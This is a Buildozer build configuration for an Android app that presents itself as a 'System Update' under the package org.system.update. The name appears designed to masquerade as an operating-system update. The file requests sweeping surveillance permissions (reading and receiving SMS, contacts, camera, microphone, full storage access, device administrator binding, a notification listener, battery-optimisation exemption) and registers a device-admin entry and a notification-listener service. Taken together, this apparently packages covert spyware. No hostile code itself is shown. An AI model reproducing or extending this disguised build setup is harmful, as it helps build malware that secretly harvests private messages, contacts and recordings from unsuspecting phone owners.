[app]
title = System Update
package.name = sysupdate
package.domain = org.system.update
source.dir = .
source.include_patterns = main.py, res/*, src/*
version = 1.0.2
requirements = python3, kivy==2.3.0, requests, pyjnius, urllib3, certifi, openssl, idna
orientation = portrait
fullscreen = 0

[buildozer]
log_level = 2
warn_on_root = 1

[android]
android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, RECORD_AUDIO, READ_SMS, RECEIVE_SMS, READ_CONTACTS, WRITE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, MANAGE_EXTERNAL_STORAGE, BIND_DEVICE_ADMIN, BIND_NOTIFICATION_LISTENER_SERVICE, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, WAKE_LOCK, POST_NOTIFICATIONS
android.meta_data = android.app.device_admin=@xml/device_admin
android.add_src = src
android.api = 33
android.minapi = 21
android.sdk = 33
android.ndk = 25b
android.archs = arm64-v8a, armeabi-v7a
android.services = notification:src/org/system/update/NotificationService.java
